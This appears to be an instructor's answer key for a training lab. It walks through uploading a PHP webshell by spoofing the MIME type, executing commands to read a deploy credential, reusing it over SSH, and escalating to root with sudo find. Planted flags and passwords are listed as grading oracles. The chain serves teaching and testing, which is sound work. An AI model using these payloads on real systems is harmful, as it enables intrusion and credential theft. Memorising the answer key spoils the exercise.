# Solution — 12 VaultLine Capstone (medium, webapp set)

> Spoilers — instructor's answer key.

## Surface

`GET /` is the VaultLine Deployment Asset Portal; `GET /upload.php` accepts a "release asset"
upload; uploaded files are served (and PHP-executed) from `GET /uploads/<name>`. The internal
goal host `vault.vaultline.lab` runs **only** SSH — no web — reachable from the edge host over
`10.21.12.0/24`, and loopback-published at `127.0.0.1:8712` for your convenience.

The full chain is **C → J → I → K**: upload → RCE → credential reuse → SSH lateral → privesc.

## Intended chain

### 1. Foothold — insufficient-validation upload → webshell → RCE (C/J)

`upload.php` validates the uploaded file by its **client-supplied MIME type**
(`$_FILES['artifact']['type']`) against an image allow-list, and keeps the original filename and
extension. Send a PHP file but claim `Content-Type: image/png`:

```sh
printf '<?php system($_GET["c"]); ?>' > shell.php
curl -s -F 'artifact=@shell.php;type=image/png' http://127.0.0.1:8512/upload.php
# -> "Stored release asset." + preview link uploads/shell.php
curl -s 'http://127.0.0.1:8512/uploads/shell.php?c=id'
# -> uid=33(www-data) gid=33(www-data) ...
```

That is code execution on the edge host as `www-data`.

### 2. Recover the reused credential (loot)

The deploy agent's config sits on the edge host and is world-readable. Read it through the
webshell:

```sh
curl -s 'http://127.0.0.1:8512/uploads/shell.php?c=cat%20/opt/vaultline/deploy.conf'
```
```ini
DEPLOY_TARGET=vault.vaultline.lab
DEPLOY_USER=svc
DEPLOY_PASSWORD=V4ultL1ne-deploy-7e2a9c
```

The config spells out both the target host and the account: **`svc` @ `vault.vaultline.lab`**,
password **`V4ultL1ne-deploy-7e2a9c`**.

### 3. Lateral movement — SSH credential reuse (I)

The deploy password is reused verbatim as `svc`'s **SSH** password on the goal host. Two ways to
prove it:

```sh
# From the operator box, via the published port:
ssh -p 8712 svc@127.0.0.1            # password: V4ultL1ne-deploy-7e2a9c

# Or pivot from the edge foothold over the internal net (openssh-client is installed on edge):
ssh svc@vault.vaultline.lab          # 10.21.12.30, reachable from edge on 10.21.12.0/24
```

`hydra -l svc -p V4ultL1ne-deploy-7e2a9c ssh://127.0.0.1:8712` confirms it too. Root SSH login is
disabled, so you land as `svc`.

### 4. Privilege escalation — sudo find (K)

`svc` may run `find` as root with no password (`/etc/sudoers.d/svc`). GTFOBins:

```sh
sudo -n /usr/bin/find . -exec /bin/sh \; -quit
# id -> uid=0(root)
cat /root/crown_jewels.txt
```

### 5. Crown jewels

`/root/crown_jewels.txt` (mode 600, root-only until the privesc) holds the marker
`VAULTLINE-CROWN{master-vault-exfil-ok}` plus the KeePass master passphrase, a root recovery API
key and a prod signing key — the reportable end of the chain.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `reused-deploy-credential` | `V4ultL1ne-deploy-7e2a9c` | edge `/opt/vaultline/deploy.conf` |
| `goal-ssh-banner` | `SSH-2.0` banner | `tcp 127.0.0.1:8712` |
| `crown-jewels` | `VAULTLINE-CROWN{master-vault-exfil-ok}` | goal `/root/crown_jewels.txt` |
| `edge-app-identity` | `VaultLine` | `GET http://127.0.0.1:8512/` |

Credential: **`svc` : `V4ultL1ne-deploy-7e2a9c`** (edge deploy.conf == goal SSH password).

## Reset

`make lab-restore LAB=12-medium-capstone` (recreate — drops any uploaded webshell and re-seeds
both hosts to pristine).
